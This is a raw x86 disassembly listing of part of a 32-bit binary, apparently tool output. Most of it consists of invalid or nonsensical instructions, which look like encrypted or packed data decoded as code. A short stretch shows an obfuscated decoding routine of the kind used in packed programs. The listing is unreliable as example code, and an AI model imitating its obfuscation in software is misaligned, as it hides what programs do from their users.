  402905:	inc    ebp
  402906:	retf   0xf3f3
  402909:	pop    edi
  40290a:	mov    ebp,DWORD PTR [ebx+eiz*4]
  40290d:	fs (bad) 
  40290f:	pop    eax
  402910:	fist   WORD PTR [ebp+eiz*8+0xc]
  402914:	and    edx,DWORD PTR [esi+0x69c209ef]
  40291a:	sub    bl,BYTE PTR es:[ebp+0x41]
  40291e:	and    DWORD PTR [edi-0x78],0xb5dd910e
  402925:	push   es
  402926:	push   esp
  402927:	popa   
  402928:	sbb    cl,BYTE PTR [edi-0x1addc7a0]
  40292e:	(bad)  
  40292f:	shl    DWORD PTR ss:[eax],cl
  402932:	out    0xad,eax
  402934:	ret    
  402935:	add    eax,0xe24fe661
  40293a:	sti    
  40293b:	in     al,dx
  40293c:	push   eax
  40293d:	sbb    al,0xef
  40293f:	outs   dx,DWORD PTR ds:[esi]
  402940:	es xchg ecx,eax
  402942:	lahf   
  402943:	(bad)  
  402944:	or     DWORD PTR [ecx+ebx*4-0x74],edi
  402948:	lods   al,BYTE PTR ds:[esi]
  402949:	cmp    ah,BYTE PTR [edi+0x5d]
  40294c:	add    ch,BYTE PTR [edx]
  40294e:	and    ah,cl
  402950:	out    dx,al
  402951:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402952:	push   esi
  402953:	and    cl,cl
  402955:	mov    gs,WORD PTR [edx+0x28]
  402958:	adc    ebx,ebx
  40295a:	push   es
  40295b:	pop    esi
  40295c:	popa   
  40295d:	imul   esi,DWORD PTR [eax-0xa36ee08],0xffffffe8
  402964:	xchg   DWORD PTR [ebx],eax
  402966:	jle    0x4029bd
  402968:	sbb    esi,DWORD PTR [ecx+0x14]
  40296b:	out    dx,al
  40296c:	mov    ch,0x27
  40296e:	cmp    eax,0xec7fa088
  402973:	sub    eax,0x741c281a
  402978:	test   al,0x94
  40297a:	and    al,0x52
  40297c:	pop    edi
  40297d:	in     al,dx
  40297e:	mov    ah,0xbe
  402980:	inc    eax
  402981:	into   
  402982:	pop    eax
  402983:	jmp    0x4029f2
  402985:	or     BYTE PTR [ebx],ch
  402987:	sub    BYTE PTR [ebx+edi*4-0x53],0x65
  40298c:	push   ax
  40298e:	adc    al,0x7a
  402990:	fcomp  DWORD PTR ds:0x6874eefc
  402996:	stos   BYTE PTR es:[edi],al
  402997:	cmp    dl,bl
  402999:	lods   al,BYTE PTR ds:[esi]
  40299a:	popf   
  40299b:	sub    BYTE PTR [ebp-0x39c4667b],0x66
  4029a2:	cmp    BYTE PTR [edi+edx*4-0x7c9df1b1],bl
  4029a9:	xchg   ecx,eax
  4029aa:	cmp    BYTE PTR [edx+0x1bcf1816],0x5c
  4029b1:	sub    esi,DWORD PTR [edx+0x5e]
  4029b4:	cs pop edi
  4029b6:	out    dx,al
  4029b7:	imul   eax,esi,0x4faa516d
  4029bd:	in     eax,0x93
  4029bf:	xor    DWORD PTR [ebp+0x22f11586],ecx
  4029c5:	cmc    
  4029c6:	sub    al,0xac
  4029c8:	rcr    DWORD PTR gs:[ebx-0x165a0b7b],0x93
  4029d0:	jo     0x4029c8
  4029d2:	lahf   
  4029d3:	and    DWORD PTR [edx],0x8
  4029d6:	jno    0x402a18
  4029d8:	(bad)  
  4029d9:	push   ds
  4029da:	cwde   
  4029db:	in     al,dx
  4029dc:	in     al,0x3f
  4029de:	inc    ebp
  4029df:	(bad)  
  4029e0:	xor    edx,esi
  4029e2:	push   ds
  4029e3:	out    dx,al
  4029e4:	das    
  4029e5:	mov    ds:0x1d725243,al
  4029ea:	lock pop edx
  4029ec:	xor    eax,0x6bd714d8
  4029f1:	in     eax,dx
  4029f2:	cmp    cl,BYTE PTR [edi]
  4029f4:	test   eax,0xa5d1c101
  4029f9:	test   al,0x8f
  4029fb:	pop    ds
  4029fc:	fnstsw WORD PTR [edx]
  4029fe:	fucomi st,st(6)
  402a00:	pop    ebp
  402a01:	ja     0x402a25
  402a03:	xchg   ebp,edx
  402a05:	stos   DWORD PTR es:[edi],eax
  402a06:	loopne 0x4029a3
  402a08:	sar    esp,cl
  402a0a:	pop    edx
  402a0b:	clc    
  402a0c:	int3   
  402a0d:	jl     0x4029dd
  402a0f:	add    BYTE PTR [edx-0x70],cl
  402a12:	lds    ebx,FWORD PTR [edi+esi*1-0x6d57705f]
  402a19:	(bad)  
  402a1b:	sub    eax,0xdbb78399
  402a20:	test   al,0x81
  402a22:	xor    ecx,DWORD PTR [ebp-0x71]
  402a25:	cmp    bl,bl
  402a27:	or     DWORD PTR [esi-0x45],0xffffffcc
  402a2b:	hlt    
  402a2c:	(bad)  
  402a2d:	jo     0x4029c2
  402a2f:	mov    edx,0x38d37004
  402a34:	xor    esi,DWORD PTR [eax-0x5b]
  402a37:	mov    esi,0xcb9c49c
  402a3c:	push   ds
  402a3d:	sti    
  402a3e:	and    bl,BYTE PTR [esi]
  402a40:	cmc    
  402a41:	arpl   WORD PTR [ebx],sp
  402a43:	pop    ds
  402a44:	sub    al,0xa5
  402a46:	push   ss
  402a47:	js     0x402aa6
  402a49:	mov    ecx,0x128f2cfa
  402a4e:	jg     0x402abd
  402a50:	retf   
  402a51:	pushf  
  402a52:	xchg   edx,eax
  402a53:	and    ah,BYTE PTR [esi+0x45a7ee1b]
  402a59:	fldenv [edx-0x60]
  402a5c:	fist   DWORD PTR [edx+esi*1]
  402a5f:	add    eax,DWORD PTR [esi-0x6c]
  402a62:	pop    eax
  402a63:	ret    0x806d
  402a66:	ss hlt 
  402a68:	popf   
  402a69:	lea    eax,[ecx]
  402a6b:	dec    esp
  402a6c:	mov    eax,0xb576aeb8
  402a71:	jg     0x402a3f
  402a73:	mov    ebp,0xf460d1f9
  402a78:	mov    ebp,0xadf92a22
  402a7d:	xor    esp,edx
  402a7f:	jb     0x402a5a
  402a81:	fs clc 
  402a83:	xadd   esp,esi
  402a86:	inc    esp
  402a87:	xchg   DWORD PTR [eax],esi
  402a89:	gs into 
  402a8b:	pop    ecx
  402a8c:	and    DWORD PTR [eax],edx
  402a8e:	add    cl,0x46
  402a91:	outs   dx,DWORD PTR ds:[esi]
  402a92:	ret    
  402a93:	xor    ebp,ecx
  402a95:	pop    es
  402a96:	or     al,0xf1
  402a98:	js     0x402af3
  402a9a:	stos   DWORD PTR es:[edi],eax
  402a9b:	pusha  
  402a9c:	inc    edx
  402a9d:	test   DWORD PTR [edi+ecx*4-0x59],0xbdf32063
  402aa5:	mov    DWORD PTR [eax-0x466c2d9c],eax
  402aab:	inc    ebp
  402aac:	nop
  402aad:	fild   DWORD PTR [ebx+0x7eee8856]
  402ab3:	in     al,dx
  402ab4:	aas    
  402ab5:	mov    dh,0xb1
  402ab7:	(bad)  
  402ab9:	mov    DWORD PTR [edi-0x7e],ebp
  402abc:	cdq    
  402abd:	push   0x2a
  402abf:	lock pop ebx
  402ac1:	retf   0xee6a
  402ac4:	or     eax,0x340f1471
  402aca:	mov    ebp,0xceed363d
  402acf:	mov    bh,0x72
  402ad1:	stos   DWORD PTR es:[edi],eax
  402ad2:	mov    ebp,0x30b9822d
  402ad7:	or     DWORD PTR [eax-0x7c],eax
  402ada:	scas   eax,DWORD PTR es:[edi]
  402adb:	je     0x402b32
  402add:	(bad)  
  402ade:	push   esi
  402adf:	inc    esi
  402ae0:	test   eax,0xa17ec5f9
  402ae5:	adc    al,BYTE PTR [edx+0x5c]
  402ae8:	sbb    edi,DWORD PTR [esi-0x3cc490bb]
  402aee:	cmp    al,0x89
  402af0:	push   0x3c
  402af2:	xor    DWORD PTR [ebx],edi
  402af4:	mov    bh,BYTE PTR ds:0x31fe59da
  402afa:	add    DWORD PTR [eax],eax
  402afc:	jbe    0x402a81
  402afe:	push   es
  402aff:	mov    eax,0xedab1366
  402b04:	in     al,0x65
  402b06:	call   edi
  402b08:	push   esp
  402b09:	inc    edi
  402b0a:	pop    eax
  402b0b:	cdq    
  402b0c:	(bad)  
  402b0e:	ds jns 0x402a9f
  402b11:	(bad)  
  402b12:	fst    QWORD PTR [ebx]
  402b14:	call   0x31e55d51
  402b19:	jg     0x402b01
  402b1b:	jno    0x402b5b
  402b1d:	fild   WORD PTR [edi]
  402b1f:	dec    ebp
  402b20:	xor    dl,BYTE PTR [esi]
  402b22:	cmp    bl,BYTE PTR [edi-0x1941eb80]
  402b28:	and    al,0x62
  402b2a:	fucomi st,st(4)
  402b2c:	pop    ds
  402b2d:	ins    BYTE PTR es:[edi],dx
  402b2e:	inc    edx
  402b2f:	sbb    bl,al
  402b31:	mov    DWORD PTR [edi],ebp
  402b33:	sub    ecx,DWORD PTR [edx+0x84ecd87]
  402b39:	shl    DWORD PTR [esp+edi*4+0x12b819d6],0xdd
  402b41:	sbb    DWORD PTR [ecx+0x4e3f39d6],eax
  402b47:	fs out dx,al
  402b49:	xchg   BYTE PTR ds:0x9a7b257e,dh
  402b4f:	jbe    0x402b9a
  402b51:	sub    BYTE PTR [esi+0x3c5f7c45],dh
  402b57:	(bad)  
  402b58:	mov    eax,ds:0x44e46889
  402b5d:	mov    eax,0x607b1b3a
  402b62:	sbb    DWORD PTR [ecx-0x28],eax
  402b65:	pop    ebx
  402b66:	cdq    
  402b67:	mov    eax,ds:0x786f2214
  402b6c:	push   ebx
  402b6d:	addr16 xor eax,0xa8e55928
  402b73:	ins    BYTE PTR es:[edi],dx
  402b74:	inc    ecx
  402b75:	adc    al,0x9b
  402b78:	add    bl,cl
  402b7a:	mov    edi,0x9160b820
  402b7f:	cmp    al,0xf0
  402b81:	popa   
  402b82:	ins    BYTE PTR es:[edi],dx
  402b83:	pop    ecx
  402b84:	sub    dl,dl
  402b86:	adc    al,0x28
  402b88:	add    eax,0x8835a3bd
  402b8d:	jo     0x56bec66b
  402b93:	mov    ch,0x41
  402b95:	mov    al,ds:0xcf584853
  402b9a:	xor    DWORD PTR [esi+0x25632e21],esp
  402ba0:	mov    ch,0x2b
  402ba2:	loop   0x402b56
  402ba4:	sub    al,0xb7
  402ba6:	mov    al,BYTE PTR [ebx-0x72]
  402ba9:	test   DWORD PTR [esi+0x4ebafc7f],edi
  402baf:	daa    
  402bb0:	iret   
  402bb1:	in     al,dx
  402bb2:	das    
  402bb3:	sub    BYTE PTR [eax+0x5842229c],dl
  402bb9:	rcr    BYTE PTR [edi-0x52],0xa8
  402bbd:	out    0x79,eax
  402bbf:	mov    esi,0xe6312db0
  402bc4:	clc    
  402bc5:	inc    eax
  402bc6:	add    eax,0x8a43d9e4
  402bcb:	stos   BYTE PTR es:[edi],al
  402bcc:	call   0x7fed:0xde6d8d1e
  402bd3:	mov    ebx,DWORD PTR [ebp+eax*4+0x5a4ddabb]
  402bda:	jg     0x402b68
  402bdc:	lods   al,BYTE PTR ds:[esi]
  402bdd:	push   eax
  402bde:	dec    eax
  402bdf:	jnp    0x402c02
  402be1:	or     bh,BYTE PTR [esi]
  402be3:	pop    ss
  402be4:	fiadd  WORD PTR [edi-0x35]
  402be7:	add    BYTE PTR [ecx-0x2d8ee12b],dl
  402bed:	sub    al,0xe
  402bef:	aam    0xaa
  402bf1:	push   ds
  402bf2:	(bad)  
  402bf3:	retf   
  402bf4:	push   cs
  402bf5:	addr16 pop ecx
  402bf7:	sub    BYTE PTR [edx+0x6],0x9e
  402bfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bfc:	inc    edi
  402bfd:	test   eax,0xe30411f1
  402c02:	scas   eax,DWORD PTR es:[edi]
  402c03:	fdivr  DWORD PTR [ebx]
  402c05:	pushf  
  402c06:	jae    0x402c66
  402c08:	mov    cl,BYTE PTR [esi]
  402c0a:	push   esp
  402c0c:	pop    esp
  402c0d:	mov    edi,DWORD PTR [ecx]
  402c0f:	adc    DWORD PTR [esi],esi
  402c11:	fdiv   DWORD PTR [edx+0x31]
  402c14:	sub    BYTE PTR [ecx+ebx*4],dl
  402c17:	mov    cl,0xf8
  402c19:	jnp    0x402b9d
  402c1b:	cli    
  402c1c:	pop    ds
  402c1d:	or     ecx,DWORD PTR [ebx]
  402c1f:	xor    eax,0x17739d9d
  402c24:	cwde   
  402c25:	cmovs  eax,DWORD PTR [edi]
  402c28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c29:	(bad)  
  402c2a:	mov    ah,0x84
  402c2c:	fcmovnb st,st(1)
  402c2e:	add    bl,BYTE PTR [edi-0x4f]
  402c31:	aad    0x47
  402c33:	fwait
  402c34:	mov    ebp,0x2991b88f
  402c39:	ret    
  402c3a:	jl     0x402c44
  402c3c:	pop    ebx
  402c3d:	push   0x20
  402c3f:	test   al,0x8b
  402c41:	lahf   
  402c42:	and    DWORD PTR [ecx-0x6208a687],edi
  402c48:	sub    DWORD PTR [eax],ebx
  402c4a:	push   esi
  402c4b:	retf   
  402c4c:	out    0xcb,al
  402c4e:	rcl    BYTE PTR [edi+0x406b3f3],cl
  402c54:	test   al,0x4
  402c56:	in     al,dx
  402c57:	js     0x402c9e
  402c59:	adc    eax,0x73d34ed0
  402c5e:	adc    eax,0x93160c8b
  402c63:	icebp  
  402c64:	and    eax,0x88943d00
  402c69:	loope  0x402c05
  402c6b:	fisub  WORD PTR [edi]
  402c6d:	ins    BYTE PTR es:[edi],dx
  402c6e:	ds push ecx
  402c70:	and    al,BYTE PTR [ebp+0x30]
  402c73:	pop    es
  402c74:	ja     0x402bf9
  402c76:	jmp    0x9c635456
  402c7b:	mov    eax,ds:0x86057b7d
  402c80:	fucom  st(0)
  402c82:	xchg   BYTE PTR [eax+0xb33d0e1],bl
  402c88:	ror    esp,cl
  402c8a:	or     eax,0xd1e9e28a
  402c8f:	xor    ah,BYTE PTR [eax+0x54]
  402c92:	aaa    
  402c93:	sub    eax,0x572a9cc8
  402c98:	dec    ecx
  402c99:	mov    eax,0x707c3606
  402c9e:	mov    dh,0xc3
  402ca0:	jnp    0x402cc7
  402ca2:	repz jmp 0x130f:0xf01670cb
  402caa:	push   0x2a
  402cac:	es in  eax,0x62
  402caf:	in     eax,0x95
  402cb1:	fadd   DWORD PTR [esi-0x34]
  402cb4:	arpl   WORD PTR [eax-0x600d86d7],cx
  402cba:	(bad)  [eax]
  402cbc:	sbb    al,0xbf
  402cbe:	in     eax,dx
  402cbf:	add    eax,0xaa
  402cc4:	push   eax
  402cc5:	mov    eax,DWORD PTR [ebp-0x18]
  402cc8:	mov    eax,DWORD PTR [eax+0x198]
  402cce:	push   DWORD PTR [eax]
  402cd0:	call   0x40c099
  402cd5:	mov    DWORD PTR [ebp-0x4],eax
  402cd8:	cmp    DWORD PTR [ebp-0x4],0x0
  402cdc:	lea    eax,[ebp+0x4]
  402cdf:	mov    DWORD PTR [ebp-0x38],eax
  402ce2:	je     0x404656
  402ce8:	lea    eax,[ebp-0xc]
  402ceb:	mov    DWORD PTR [ebp-0x30],eax
  402cee:	mov    eax,DWORD PTR [ebp-0x4c]
  402cf1:	xor    eax,esi
  402cf3:	add    eax,edi
  402cf5:	mov    DWORD PTR [ebp-0x34],eax
  402cf8:	mov    eax,DWORD PTR [ebp-0x28]
  402cfb:	xor    eax,esi
  402cfd:	add    eax,edi
  402cff:	mov    DWORD PTR [ebp-0x20],eax
  402d02:	mov    eax,DWORD PTR [ebp-0x4]
  402d05:	mov    DWORD PTR [ebp-0x24],eax
  402d08:	lea    eax,[ebp-0x98]
  402d0e:	mov    DWORD PTR [ebp-0x8],eax
  402d11:	mov    eax,DWORD PTR [ebp-0x10]
  402d14:	mov    DWORD PTR [ebp-0x10],eax
  402d17:	mov    eax,DWORD PTR [ebp-0x1c]
  402d1a:	mov    DWORD PTR [ebp-0x40],ebx
  402d1d:	mov    DWORD PTR [ebp-0x2c],eax
  402d20:	mov    eax,DWORD PTR [ebp-0x40]
  402d23:	mov    ecx,DWORD PTR [ebp-0x8]
  402d26:	xor    eax,esi
  402d28:	add    eax,0x32729b
  402d2d:	jmp    0x40313b
  402d32:	stos   DWORD PTR es:[edi],eax
  402d33:	addr16 clc 
  402d35:	in     eax,0x50
  402d37:	loope  0x402dac
  402d39:	jno    0x402d4f
  402d3b:	jo     0x402d34
  402d3d:	fs xor eax,0x982172c0
  402d43:	or     DWORD PTR [esi+0x7e],edi
  402d46:	outs   dx,DWORD PTR ds:[esi]
  402d47:	jge    0x402dc7
  402d49:	jle    0x402d4b
  402d4b:	add    al,0x44
  402d4d:	jo     0x402d4f
  402d4f:	push   0x40
  402d51:	mov    ecx,0x421cdc1d
  402d56:	xor    eax,0x5db2f20
  402d5b:	call   0x424f:0xbdc246dc
  402d62:	mov    DWORD PTR [edx+0x41],esi
  402d65:	mov    ch,0x3a
  402d67:	ret    
  402d68:	in     eax,0xf6
  402d6a:	adc    eax,0xa67f7ea5
  402d6f:	mov    dh,0x87
  402d71:	dec    esp
  402d72:	pop    edi
  402d73:	retf   0x11f1
  402d76:	aaa    
  402d77:	cmp    esi,DWORD PTR [edx+0x2fa08620]
  402d7d:	pop    ebx
  402d7e:	shl    dh,cl
  402d80:	fstp   QWORD PTR [ebx+eiz*2-0x2b]
  402d84:	dec    DWORD PTR [eax-0x4b97ad94]
  402d8a:	in     al,0xe0
  402d8c:	out    0x19,al
  402d8e:	jle    0x402d75
  402d90:	push   eax
  402d91:	mov    ch,0x7
  402d93:	fs pop ebx
  402d95:	sbb    eax,0x55597f06
  402d9a:	in     al,dx
  402d9b:	fst    QWORD PTR gs:[eax-0xa]
  402d9f:	push   ebp
  402da0:	imul   ecx,ebx,0xa974efca
  402da6:	and    bh,BYTE PTR [eax-0x1c0b24c5]
  402dac:	push   eax
  402dad:	dec    ebx
  402daf:	lods   eax,DWORD PTR ds:[esi]
  402db0:	stos   BYTE PTR es:[edi],al
  402db1:	cmp    ah,BYTE PTR [eax]
  402db3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402db4:	xor    ah,BYTE PTR [edi]
  402db6:	shl    DWORD PTR ss:[edi+0x6],0xfe
  402dbb:	add    ch,ah
  402dbd:	inc    esi
  402dbe:	push   esi
  402dbf:	(bad)  
  402dc0:	lods   al,BYTE PTR ds:[esi]
  402dc1:	pop    edi
  402dc2:	xchg   DWORD PTR [ecx],esp
  402dc4:	fld    DWORD PTR [esi+0x1b]
  402dc7:	test   BYTE PTR [ecx+0x18],0x48
  402dcb:	pop    ss
  402dcc:	(bad)  
  402dce:	mov    BYTE PTR [ecx],ch
  402dd0:	das    
  402dd1:	lahf   
  402dd2:	xchg   ebx,eax
  402dd3:	pop    ds
  402dd4:	std    
  402dd5:	pop    es
  402dd6:	es push edx
  402dd8:	shl    DWORD PTR [eax-0x1d],1
  402ddb:	push   ecx
  402ddc:	sub    ch,0x66
  402ddf:	in     eax,0xa1
  402de1:	pop    ds
  402de2:	sbb    al,cl
  402de4:	rcr    bl,cl
  402de6:	jbe    0x402d93
  402de8:	fcomp  DWORD PTR [edi]
  402dea:	adc    BYTE PTR [ebp-0x12],bl
  402ded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dee:	loopne 0x402e46
  402df0:	inc    edi
  402df1:	je     0x402e5b
  402df3:	fnstcw WORD PTR [eax]
  402df5:	and    BYTE PTR [esi],ch
  402df7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402df8:	out    dx,eax
  402df9:	icebp  
  402dfa:	jb     0x402e0e
  402dfc:	shr    DWORD PTR [eax],0x87
  402dff:	cld    
  402e00:	std    
  402e01:	pushf  
  402e02:	icebp  
  402e03:	push   es
  402e04:	scas   eax,DWORD PTR es:[edi]
  402e05:	xchg   edx,eax
  402e06:	or     eax,0xfe42d43a
  402e0b:	sbb    ch,BYTE PTR [edx]
  402e0d:	sub    bl,BYTE PTR [ecx+0x3c]
  402e10:	sbb    al,BYTE PTR [ecx]
  402e12:	add    al,0xc1
  402e14:	retf   0xef4c
  402e17:	mov    al,ds:0x71e650b4
  402e1c:	(bad)  
  402e1e:	push   ss
  402e1f:	iret   
  402e20:	fnstsw WORD PTR [ebx+0x542ffcf0]
  402e26:	pop    edx
  402e27:	push   ecx
  402e28:	add    eax,0x57b0ecb6
  402e2d:	add    ah,ah
  402e2f:	scas   al,BYTE PTR es:[edi]
  402e30:	xor    ebx,esp
  402e32:	push   esp
  402e33:	ja     0x402dfa
  402e35:	cmp    BYTE PTR [edx],dh
  402e37:	inc    ebx
  402e38:	and    al,0x9e
  402e3a:	jmp    0x402dcc
  402e3c:	lods   al,BYTE PTR ds:[esi]
  402e3d:	pop    edi
  402e3e:	push   eax
  402e3f:	push   esp
  402e40:	sar    bh,1
  402e42:	add    eax,0x2d2b5e60
  402e47:	pop    eax
  402e48:	push   eax
  402e49:	dec    esp
  402e4a:	pop    ecx
  402e4b:	fidiv  WORD PTR ds:0x509ce8f8
  402e51:	mov    edx,0x9ffb465f
  402e56:	sub    DWORD PTR [ebx+0x4d208b28],edx
  402e5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e5d:	fwait
  402e5e:	pop    es
  402e5f:	mov    ds:0x6218fa37,eax
  402e64:	lods   al,BYTE PTR ds:[esi]
  402e65:	sub    bl,BYTE PTR [ebx+0x7449c9bc]
  402e6b:	jmp    0x402eb0
  402e6d:	pop    ecx
  402e6e:	dec    ebp
  402e6f:	jns    0x402eae
  402e71:	inc    edx
  402e72:	lods   al,BYTE PTR ds:[esi]
  402e73:	rcr    DWORD PTR [ecx-0x69],0xd7
  402e77:	(bad)  
  402e78:	mov    bh,BYTE PTR [edi+0x4b4054ae]
  402e7e:	cmp    esp,DWORD PTR [ebx+0x0]
  402e81:	cmp    DWORD PTR [edx],ebp
  402e83:	add    ax,0xa117
  402e87:	int    0xae
  402e89:	or     eax,0x2b6ff4c7
  402e8e:	and    DWORD PTR [esi+esi*4-0x319a58b1],edx
  402e95:	mov    dh,0xba
  402e97:	adc    BYTE PTR fs:[ebp+0x21],al
  402e9b:	jae    0x402e9f
  402e9d:	mov    ebx,0x80d0d178
  402ea2:	aam    0x4b
  402ea4:	ins    DWORD PTR es:[edi],dx
  402ea5:	mov    ebx,ecx
  402ea7:	(bad)  
  402ea8:	jbe    0x402e2a
  402eaa:	sbb    BYTE PTR [eax+0x5eea1090],dh
  402eb0:	sbb    eax,0x8bd98ba6
  402eb5:	mov    dl,ch
  402eb7:	das    
  402eb8:	jp     0x402e6d
  402eba:	cmc    
  402ebb:	mov    al,0x52
  402ebd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ebe:	mov    ebx,0xd80aea4e
  402ec3:	imul   ebp,DWORD PTR [eax+0x2a8a8e31],0x42
  402eca:	(bad)  
  402ecb:	xor    al,BYTE PTR [ebp+0x17]
  402ece:	hlt    
  402ecf:	pop    ecx
  402ed0:	fld    QWORD PTR [edi+edx*1]
  402ed3:	add    dh,bl
  402ed5:	jp     0x402e9f
  402ed7:	xchg   esi,eax
  402ed8:	jg     0x402ede
  402eda:	daa    
  402edb:	mov    es:0xa8ecedf7,al
  402ee1:	cli    
  402ee2:	ins    DWORD PTR es:[edi],dx
  402ee3:	aam    0x29
  402ee5:	push   ecx
  402ee6:	icebp  
  402ee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ee8:	int3   
  402ee9:	int3   
  402eea:	xchg   esi,eax
  402eeb:	jmp    0x687f:0xb5fc01c7
  402ef2:	mov    bh,0xd8
  402ef4:	push   cs
  402ef5:	out    0x5b,eax
  402ef7:	or     DWORD PTR [edi-0x1f],esi
  402efa:	(bad)  
  402efb:	outs   dx,BYTE PTR ds:[esi]
  402efc:	aam    0x7b
  402efe:	out    0xda,al
  402f00:	mov    ebx,ss
  402f02:	sar    ecx,0x4e
  402f05:	xchg   ecx,eax
  402f06:	sbb    edx,edi
  402f08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f09:	div    DWORD PTR [esi+0x79]
  402f0c:	mov    cl,0x70
  402f0e:	jmp    0xfeb465d5
  402f13:	push   edx
  402f14:	mov    ds:0x155d210e,al
  402f19:	test   al,0xe4
  402f1b:	call   0x726362
  402f20:	in     eax,dx
  402f21:	dec    ebx
  402f22:	cmp    eax,0xd0338426
  402f27:	jbe    0x402ef5
  402f29:	js     0x402ecb
  402f2b:	inc    ebx
  402f2c:	adc    BYTE PTR [edi+0x1b],0xd9
  402f30:	sub    edi,DWORD PTR ds:0x65aa858b
  402f36:	mov    edi,DWORD PTR [ebp-0x64eef146]
  402f3c:	out    dx,al
  402f3d:	sub    ebp,ebp
  402f3f:	push   es
  402f40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f41:	add    eax,0x42bb0275
  402f46:	popa   
  402f47:	scas   eax,DWORD PTR es:[edi]
  402f48:	xlat   BYTE PTR ds:[ebx]
  402f49:	test   esi,esi
  402f4b:	mov    WORD PTR [ebp+0x520f24dc],ss
  402f51:	sub    cl,BYTE PTR [ecx]
  402f53:	shl    DWORD PTR [ebx-0x74344113],cl
  402f59:	add    cl,bh
  402f5b:	int    0xc0
  402f5d:	enter  0x1c71,0x5b
  402f61:	pusha  
  402f62:	pop    ecx
  402f63:	push   esp
  402f64:	or     DWORD PTR [edi+0x65db45e2],ebp
  402f6a:	sar    DWORD PTR [eax+ecx*2-0x1d1a24e3],1
  402f71:	xor    DWORD PTR [ebx],ebp
  402f73:	sahf   
  402f74:	aad    0xcf
  402f76:	sahf   
  402f77:	push   eax
  402f78:	mov    al,ds:0x46c67723
  402f7d:	inc    BYTE PTR [ebp-0x4b2646c5]
  402f83:	addr16 aas 
  402f85:	adc    al,0x87
  402f87:	sbb    al,0x59
  402f89:	fnstsw WORD PTR [edi-0xf628ae3]
  402f8f:	loopne 0x402f33
  402f91:	fisttp WORD PTR [ebx]
  402f93:	push   ecx
  402f94:	push   ecx
  402f95:	enter  0x1aca,0x4b
  402f99:	sbb    dl,BYTE PTR [eax]
  402f9b:	bound  edx,QWORD PTR [ebx-0x297a3d05]
  402fa1:	lea    ebx,[eax+esi*2]
  402fa4:	rcl    edx,0x75
  402fa7:	mov    cl,0xbf
  402fa9:	inc    esp
  402faa:	loop   0x403025
  402fac:	aaa    
  402fad:	cmp    cl,BYTE PTR [eiz*2+0x6039b063]
  402fb4:	adc    al,0x82
  402fb6:	adc    DWORD PTR [ecx-0x26],eax
  402fb9:	or     BYTE PTR [bx+di+0x76bc],0xa1
  402fbf:	jb     0x402f73
  402fc1:	jno    0x403028
  402fc3:	lods   al,BYTE PTR ds:[esi]
  402fc4:	lock loope 0x402ff3
  402fc7:	clc    
  402fc8:	xchg   edi,esi
  402fca:	fs hlt 
  402fcc:	mov    ebp,0x744a7e37
  402fd1:	aam    0x2a
  402fd3:	xchg   ecx,eax
  402fd4:	sbb    eax,0xa8eb2eab
  402fd9:	int    0x6
  402fdb:	jne    0x402f91
  402fdd:	xchg   BYTE PTR [eax],al
  402fdf:	lods   al,BYTE PTR ds:[esi]
  402fe0:	dec    ecx
  402fe1:	mov    eax,ds:0xb40e3011
  402fe6:	or     eax,DWORD PTR [ebx-0x25b8ef85]
  402fec:	pop    ecx
  402fed:	mov    dl,BYTE PTR [edx]
  402fef:	cwde   
  402ff0:	lock movs BYTE PTR es:[di],BYTE PTR ds:[si]
  402ff3:	hlt    
  402ff4:	aaa    
  402ff5:	fidivr WORD PTR [ecx+0x5b7afe7f]
  402ffb:	ror    ebp,1
  402ffd:	mov    bh,0x36
  402fff:	dec    edx
  403000:	loope  0x40304e
  403002:	std    
  403003:	icebp  
  403004:	icebp  
  403005:	jbe    0x402fc0
  403007:	push   edx
  403008:	shr    esi,0x9a
  40300b:	mov    ecx,0x1db9b078
  403010:	xlat   BYTE PTR ds:[ebx]
  403011:	stc    
  403012:	imul   ebx,DWORD PTR [edx+0x15aa0c5],0x9ae1b0d2
  40301c:	jnp    0x402fd7
  40301e:	pop    eax
  40301f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403020:	js     0x402fcb
  403022:	jnp    0x4030a3
  403024:	sub    BYTE PTR [ebp+0x6c6afe4],dl
  40302a:	add    DWORD PTR [eax-0x3d2eb8bd],0x7c
  403031:	sub    eax,0x1b3f5028
  403036:	stos   DWORD PTR es:[edi],eax
  403037:	adc    DWORD PTR [ecx+0x6f],0xffffffd5
  40303b:	xor    dh,0x50
  40303e:	xchg   edx,eax
  40303f:	push   eax
  403040:	or     BYTE PTR [edi+0x752a86e2],cl
  403046:	test   eax,0x44d6967a
  40304b:	ret    
  40304c:	push   0x65a5a583
  403051:	std    
  403052:	bound  ebx,QWORD PTR [ebx-0x3b]
  403055:	outs   dx,DWORD PTR ds:[esi]
  403056:	push   esi
  403057:	dec    esp
  403058:	cmp    ah,BYTE PTR [esi-0x4e8db93e]
  40305e:	(bad)  
  40305f:	mov    ah,0xcc
  403061:	ficomp WORD PTR [edx]
  403063:	lahf   
  403064:	int    0x7e
  403066:	dec    esi
  403067:	mov    WORD PTR [edx],fs
  403069:	push   ebx
  40306a:	int    0x6a
  40306c:	mov    WORD PTR [esi+0x19d442af],?
  403072:	adc    eax,0x397b3232
  403077:	sbb    BYTE PTR [edi-0x21],cl
  40307a:	sahf   
  40307b:	ret    
  40307c:	sbb    DWORD PTR [ebx+edi*2-0x3e],esi
  403080:	push   ss
  403081:	dec    ecx
  403082:	mov    ebp,0xcb01eda5
  403087:	stos   DWORD PTR es:[edi],eax
  403088:	mov    eax,ds:0x296af25d
  40308d:	and    eax,0xaa6ff87d
  403092:	popf   
  403093:	push   0x8ccb959b
  403098:	pop    ds
  403099:	mov    esi,0xbe916759
  40309e:	xor    eax,0x7d620ccf
  4030a3:	div    edx
  4030a5:	arpl   WORD PTR [ebx-0x6d41d23d],di
  4030ab:	sbb    esi,edx
  4030ad:	push   eax
  4030ae:	in     eax,dx
  4030af:	or     ah,BYTE PTR [ecx-0x2fd9e8d2]
